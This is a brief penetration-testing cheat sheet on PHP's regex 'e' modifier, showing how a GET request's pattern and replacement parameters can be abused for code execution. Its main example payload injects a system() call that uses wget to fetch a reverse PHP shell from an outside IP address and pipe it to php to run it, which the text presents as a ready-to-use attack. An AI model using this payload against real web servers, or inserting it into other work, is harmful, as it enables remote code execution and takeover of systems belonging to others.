# PHP

## Regex

If there is a regex match(e.g replace function), you can append `e` to the end.  This will  evaluate the replacement as code.



For example get request with interacts with PHP:

~~~
pattern=/thispattern/&replacement=replacementtext
~~~



Can execute a system command as follows:

~~~ht
pattern=/thispattern/e&replacement=system('wget 1.2.3.4/phpreverseshell.php | php')
~~~

this will do a wget to retrieve a reversephp shell and execute it by piping it to `php`
